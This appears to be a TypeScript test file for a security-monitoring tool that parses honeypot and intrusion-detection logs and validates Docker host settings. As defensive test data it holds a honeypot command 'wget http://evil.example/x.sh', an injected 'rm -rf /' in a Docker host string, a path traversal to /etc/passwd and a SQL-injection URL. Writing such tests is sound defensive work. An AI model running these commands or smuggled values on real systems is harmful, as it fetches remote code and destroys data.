import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
import { SECURITY_TOOLS } from './catalog.ts';
import { buildSecurityToolConfig } from './configs.ts';
import {
  buildSandboxComposeOverrideYaml,
  detectDefaultCaptureInterface,
  detectServerlessSandbox,
  findCrunBinary,
  findDockerBinary,
  findDockerdBinary,
  getDockerExecEnv,
  validateDockerHost,
} from './dockerEnv.ts';
import { resolveAutoStartTargets } from './supervisor.ts';
import { ingestNormalizedEvents } from './ingest.ts';
import {
  parseBeelzebubEvent,
  parseConpotEvent,
  parseCowrieEvent,
  parseFail2BanEvent,
  parseHfishEvent,
  parseNdjsonLines,
  parseOpenCanaryEvent,
  parseSecurityStackPayload,
  parseSuricataEve,
  parseWazuhAlert,
  parseZeekLog,
} from './parsers.ts';

test('catalog contains all 11 requested tools with unique ids', () => {
  assert.equal(SECURITY_TOOLS.length, 11);
  assert.equal(new Set(SECURITY_TOOLS.map((tool) => tool.id)).size, 11);
  const ids = new Set(SECURITY_TOOLS.map((tool) => tool.id));
  for (const id of [
    'suricata',
    'zeek',
    'wazuh',
    'security-onion',
    'fail2ban',
    'cowrie',
    't-pot',
    'opencanary',
    'hfish',
    'conpot',
    'beelzebub',
  ]) {
    assert.ok(ids.has(id as never), `missing ${id}`);
  }
});

test('parseSuricataEve maps signature severity and HTTP fields', () => {
  const events = parseSuricataEve({
    timestamp: '2026-11-21T00:00:00.000Z',
    event_type: 'alert',
    src_ip: '203.0.113.44',
    dest_ip: '10.0.0.5',
    proto: 'TCP',
    alert: {
      signature: 'ET SCAN SQL Injection Attempt',
      severity: 1,
      category: 'Attempted Administrator Privilege Gain',
    },
    http: {
      hostname: 'victim.example',
      url: '/login?q=union+select',
      http_method: 'GET',
      http_user_agent: 'sqlmap/1.8',
    },
  });
  assert.equal(events.length, 1);
  assert.equal(events[0].source, 'suricata');
  assert.equal(events[0].ip, '203.0.113.44');
  assert.equal(events[0].severity, 'CRITICAL');
  assert.equal(events[0].category, 'sqli');
  assert.equal(events[0].host, 'victim.example');
  assert.equal(events[0].userAgent, 'sqlmap/1.8');
});

test('parseZeekLog maps notice and suspicious HTTP', () => {
  const notice = parseZeekLog({
    _path: 'notice',
    ts: 1763683200,
    id: { orig_h: '198.51.100.9' },
    note: 'Scan::Port_Scan',
    msg: '198.51.100.9 scanned 20 ports',
  });
  assert.equal(notice.length, 1);
  assert.equal(notice[0].severity, 'HIGH');
  assert.equal(notice[0].category, 'scanner');

  const http = parseZeekLog({
    _path: 'http',
    ts: 1763683200,
    id: { orig_h: '198.51.100.10' },
    method: 'GET',
    host: 'victim.example',
    uri: '/.env',
    user_agent: 'curl/8',
  });
  assert.equal(http.length, 1);
  assert.equal(http[0].category, 'honeypot');
  assert.equal(http[0].severity, 'CRITICAL');
});

test('parseWazuhAlert maps rule level, MITRE and source IP', () => {
  const events = parseWazuhAlert({
    timestamp: '2026-11-21T00:00:00.000Z',
    rule: {
      level: 12,
      description: 'SSH brute force detected',
      groups: ['authentication_failures'],
      mitre: { id: ['T1110'] },
    },
    agent: { name: 'web-1', ip: '10.0.0.7' },
    data: { srcip: '203.0.113.9', url: '/wp-login.php' },
  });
  assert.equal(events.length, 1);
  assert.equal(events[0].severity, 'CRITICAL');
  assert.equal(events[0].category, 'bruteforce');
  assert.ok(events[0].detail.includes('MITRE T1110'));
  assert.equal(events[0].ip, '203.0.113.9');
});

test('parseCowrieEvent maps login, command and file transfer events', () => {
  const failed = parseCowrieEvent({
    eventid: 'cowrie.login.failed',
    timestamp: '2026-11-21T00:00:00.000Z',
    src_ip: '203.0.113.50',
    session: 'abc',
    username: 'root',
    password: 'toor',
  });
  assert.equal(failed[0].category, 'bruteforce');
  assert.equal(failed[0].severity, 'HIGH');

  const command = parseCowrieEvent({
    eventid: 'cowrie.command.input',
    timestamp: '2026-11-21T00:00:00.000Z',
    src_ip: '203.0.113.50',
    input: 'wget http://evil.example/x.sh',
  });
  assert.equal(command[0].category, 'rce');
  assert.equal(command[0].severity, 'CRITICAL');

  const download = parseCowrieEvent({
    eventid: 'cowrie.session.file_download',
    timestamp: '2026-11-21T00:00:00.000Z',
    src_ip: '203.0.113.50',
    filename: 'x.sh',
  });
  assert.equal(download[0].category, 'botnet-c2');
});

test('parseOpenCanary, Conpot, Beelzebub and HFish events', () => {
  const opencanary = parseOpenCanaryEvent({
    src_host: '203.0.113.60',
    utc_time: '2026-11-21T00:00:00.000Z',
    logtype: 2000,
    logdata: { USERNAME: 'root', PASSWORD: 'toor' },
  });
  assert.equal(opencanary[0].category, 'bruteforce');

  const conpot = parseConpotEvent({
    remote: '203.0.113.61',
    timestamp: '2026-11-21T00:00:00.000Z',
    data_type: 'modbus',
  });
  assert.equal(conpot[0].category, 'honeypot');

  const beelzebub = parseBeelzebubEvent({
    source_ip: '203.0.113.62',
    timestamp: '2026-11-21T00:00:00.000Z',
    protocol: 'ssh',
    command: 'whoami',
  });
  assert.equal(beelzebub[0].category, 'rce');
  assert.equal(beelzebub[0].severity, 'CRITICAL');

  const hfish = parseHfishEvent({
    timestamp: '2026-11-21T00:00:00.000Z',
    data: { src_ip: '203.0.113.63', type: 'ssh', event: 'login attempt' },
  });
  assert.equal(hfish[0].source, 'hfish');
});

test('parseFail2BanEvent accepts both JSON and log lines', () => {
  const json = parseFail2BanEvent({ ip: '203.0.113.70', jail: 'sshd', action: 'ban' });
  assert.equal(json[0].category, 'bruteforce');
  const line = parseFail2BanEvent('2026-11-21 00:00:00,000 fail2ban.actions [1]: NOTICE [sshd] Ban 203.0.113.71');
  assert.equal(line[0].ip, '203.0.113.71');
});

test('parseNdjsonLines keeps valid lines and reports malformed ones', () => {
  const parsed = parseNdjsonLines(
    'suricata',
    '{"event_type":"alert","src_ip":"203.0.113.80","alert":{"signature":"x","severity":2}}\nnot-json\n',
  );
  assert.equal(parsed.events.length, 1);
  assert.equal(parsed.errors.length, 1);
  assert.equal(parsed.events[0].severity, 'HIGH');
});

test('parseSecurityStackPayload accepts wrapped events arrays', () => {
  const events = parseSecurityStackPayload('cowrie', {
    events: [
      { eventid: 'cowrie.session.connect', src_ip: '203.0.113.81' },
      { eventid: 'cowrie.login.failed', src_ip: '203.0.113.82' },
    ],
  });
  assert.equal(events.length, 2);
});

test('buildSecurityToolConfig generates real upstream config files', () => {
  const suricata = buildSecurityToolConfig('suricata');
  assert.ok(suricata.files.some((file) => file.path.endsWith('suricata.yaml')));
  assert.ok(suricata.files.some((file) => file.path.endsWith('sentinel.rules')));

  const fail2ban = buildSecurityToolConfig('fail2ban');
  assert.ok(fail2ban.files.some((file) => file.content.includes('[sshd]')));
  assert.ok(fail2ban.files.some((file) => file.content.includes('cowrie')));

  const wazuh = buildSecurityToolConfig('wazuh');
  assert.ok(wazuh.files.some((file) => file.content.includes('<active-response>')));

  const cowrie = buildSecurityToolConfig('cowrie');
  assert.ok(cowrie.files.some((file) => file.content.includes('output_jsonlog')));

  const appliance = buildSecurityToolConfig('security-onion');
  assert.ok(appliance.notes.length > 0);
});

test('ingestNormalizedEvents accepts a private-IP honeypot event without blocking it', async () => {
  const result = await ingestNormalizedEvents('cowrie', [
    {
      source: 'cowrie',
      ts: new Date().toISOString(),
      ip: '10.0.0.99',
      category: 'bruteforce',
      severity: 'HIGH',
      detail: 'unit test private-ip event',
      method: 'SSH',
      path: 'cowrie.login.failed',
    },
  ]);
  assert.equal(result.accepted, 1);
  assert.equal(result.blocked, 0);
  assert.equal(result.events[0].ip, '10.0.0.99');
});

test('validateDockerHost accepts safe endpoints and rejects injection vectors', () => {
  assert.deepEqual(validateDockerHost('  '), { ok: true, value: '' });
  assert.deepEqual(validateDockerHost('tcp://203.0.113.10:2376'), {
    ok: true,
    value: 'tcp://203.0.113.10:2376',
  });
  assert.deepEqual(validateDockerHost('unix:///var/run/docker.sock'), {
    ok: true,
    value: 'unix:///var/run/docker.sock',
  });
  assert.deepEqual(validateDockerHost('ssh://deploy@vps.example.com:2222'), {
    ok: true,
    value: 'ssh://deploy@vps.example.com:2222',
  });

  assert.equal(validateDockerHost('tcp://bad.host:2375;rm -rf /').ok, false);
  assert.equal(validateDockerHost('unix://relative/path.sock').ok, false);
  assert.equal(validateDockerHost('unix:///var/../etc/passwd').ok, false);
  assert.equal(validateDockerHost('tcp://host.example:99999').ok, false);
  assert.equal(validateDockerHost('ftp://host.example:21').ok, false);
});

test('detectServerlessSandbox detects gVisor and Cloud Run accurately', () => {
  const gvisor = detectServerlessSandbox({
    procVersion: 'Linux version 4.19.0-gvisor #1 SMP',
    hasDockerSock: false,
    cgroupEntries: [],
    env: {},
  });
  assert.equal(gvisor.isServerlessSandbox, true);

  const cloudRun = detectServerlessSandbox({
    procVersion: 'Linux version 6.1.0-cloud',
    hasDockerSock: false,
    cgroupEntries: ['cpu', 'memory'],
    env: { K_SERVICE: 'sentinelglobe' },
  });
  assert.equal(cloudRun.isServerlessSandbox, true);

  const localVps = detectServerlessSandbox({
    procVersion: 'Linux version 6.8.0-generic',
    hasDockerSock: true,
    cgroupEntries: ['cpu', 'memory'],
    env: {},
  });
  assert.equal(localVps.isServerlessSandbox, false);
});

test('findDockerBinary locates custom executable binary and getDockerExecEnv adds bundled bin dir', () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sentinel-test-bin-'));
  try {
    const fakeDocker = path.join(tmpDir, 'docker');
    fs.writeFileSync(fakeDocker, '#!/bin/sh\necho Docker test\n', { mode: 0o755 });
    const found = findDockerBinary([tmpDir]);
    assert.equal(found, fakeDocker);
    const env = getDockerExecEnv({ PATH: '/usr/bin:/bin' });
    assert.ok((env.PATH ?? '').includes('.sentinel-docker/bin'));
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('buildSandboxComposeOverrideYaml resets ports to host networking for sandbox mode', () => {
  const yaml = buildSandboxComposeOverrideYaml();
  assert.ok(yaml.includes('cowrie:'));
  assert.ok(yaml.includes('opencanary:'));
  assert.ok(yaml.includes('network_mode: host'));
  assert.ok(yaml.includes('ports: !reset []'));
});

test('findDockerdBinary and findCrunBinary resolve bundled binaries', () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sentinel-daemon-bin-'));
  try {
    const fakeDaemon = path.join(tmpDir, 'dockerd');
    const fakeCrun = path.join(tmpDir, 'crun');
    fs.writeFileSync(fakeDaemon, '#!/bin/sh\necho dockerd\n', { mode: 0o755 });
    fs.writeFileSync(fakeCrun, '#!/bin/sh\necho crun\n', { mode: 0o755 });
    assert.equal(findDockerdBinary([tmpDir]), fakeDaemon);
    assert.equal(findCrunBinary([tmpDir]), fakeCrun);
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('detectDefaultCaptureInterface skips loopback and picks active ethernet interface', () => {
  const tmpNet = fs.mkdtempSync(path.join(os.tmpdir(), 'sentinel-net-'));
  try {
    fs.mkdirSync(path.join(tmpNet, 'lo'));
    fs.mkdirSync(path.join(tmpNet, 'eth1'));
    fs.mkdirSync(path.join(tmpNet, 'eth2'));
    assert.equal(detectDefaultCaptureInterface(tmpNet), 'eth2');

    fs.mkdirSync(path.join(tmpNet, 'eth0'));
    assert.equal(detectDefaultCaptureInterface(tmpNet), 'eth0');
  } finally {
    fs.rmSync(tmpNet, { recursive: true, force: true });
  }
});

test('resolveAutoStartTargets avoids heavy multi-GB pulls in serverless sandboxes unless overridden', () => {
  const sandboxTargets = resolveAutoStartTargets({ isServerlessSandbox: true, envTools: undefined });
  assert.deepEqual(sandboxTargets, ['beelzebub']);

  const vpsTargets = resolveAutoStartTargets({ isServerlessSandbox: false, envTools: undefined });
  assert.ok(vpsTargets.includes('suricata'));
  assert.ok(vpsTargets.includes('wazuh'));
  assert.ok(!vpsTargets.includes('security-onion'));

  const explicit = resolveAutoStartTargets({ isServerlessSandbox: true, envTools: 'beelzebub,opencanary' });
  assert.deepEqual(explicit, ['beelzebub', 'opencanary']);
});
